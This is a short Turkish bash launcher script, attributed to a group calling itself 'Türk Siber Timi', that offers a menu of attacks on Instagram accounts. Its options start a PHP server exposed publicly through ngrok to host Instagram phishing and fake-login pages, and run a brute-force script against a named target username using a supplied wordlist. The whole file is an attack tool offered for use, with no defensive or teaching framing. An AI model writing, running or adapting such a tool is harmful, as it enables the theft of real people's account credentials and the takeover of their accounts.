#!/bin/bash|
#Code:Yaman Efkar
#Türk Siber Timi
#İnstagram : @turksibertimi
#Youtube : YamanEfkar

clear

echo -e '\033[32;40;1m
        /\︵-︵/\
        |( ◉)(◉)|
        \ ︶V︶ /
        /↺↺↺↺↺↺↺\
        ↺↺↺↺↺↺↺↺|
        \↺↺↺↺↺↺↺/
        ¯¯/\¯/\¯¯ '



echo -e "\033[31;40;1m
\033[31;40;1m[01]\e[37mİnstagram Phishing          \033[31;40;1m[02]\e[37mİnstagram Brute-Force
\033[31;40;1m[03]\e[37mİnstagram Fake Panel


\e[31m[00]\e[37m Menü
\e[31m[99]\e[37m Exit
"
echo -e "\033[32;40;1m                      ~~~Yaman Efkar~~~"
echo ""
read -p "İslem Numarası : " islem
if [[ $islem == 1 || $islem == 01 ]]; then
        read -p "Port Giriniz: " port
        echo -e "\e[32mCode: insta01"
	sleep 2
	echo ""
	echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
	sleep 4
	cd Instagram-phishing/
	php -S 127.0.0.1:$port > -t & ngrok http $port
elif [[ $islem == 2 || $islem == 02 ]]; then
        cd  Instagram-bruteforce/
        read -p "Hedef Kullanıcının Username : " username
        echo ""
        read -p "Wordlist'in Bulunduğu Dizin : " password
        python3 instagram.py $username $password -m 3

elif [[ $islem == 3 || $islem == 03 ]]; then
        site="Instagram-fakepanel/"
        read -p "Port Giriniz: " port
        echo -e "\e[32mCode: insta02"
	sleep 2
	echo ""
	echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
	sleep 4
	cd Instagram-fakepanel/
	php -S 127.0.0.1:$port > -t & ngrok http $port
	elif [[ $islem == 9 || $islem == 99 ]]; then
	clear
	echo -e "\e[31mTürk Siber Timi İyi Günler Diler :)) ßß"
	sleep 1 
	exit 1
elif [[ $islem == 00 ]]; then
	cd ..
	cd ..
	bash tst.sh


else
	echo -e '\033[31;40;1m İslem Numaranızı Kontrol Ediniz!'
	sleep 2
	clear
	bash start.sh
fi
